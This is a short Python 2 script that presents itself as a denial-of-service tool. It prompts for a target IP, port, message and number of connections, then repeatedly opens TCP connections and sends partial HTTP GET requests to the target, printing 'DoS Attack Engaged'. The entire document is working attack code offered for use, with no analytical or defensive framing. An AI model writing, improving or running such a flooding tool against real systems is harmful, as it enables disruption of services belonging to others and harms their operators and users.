import time, socket, os, sys, string

print ("DoS mode loaded")

target_ip=raw_input("Enter your target address :")

target_port=raw_input("Enter your target port :")

target_port=int(target_port)

message=raw_input("Enter your message : ")

conn=input( "How many connections you want to make:" )

ip = socket.gethostbyname( target_ip )

def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((target_ip, target_port))
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (target_ip, target_port) )
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[DoS Attack Engaged]       |")
    ddos.close()
 
for i in xrange(conn):
    dos()
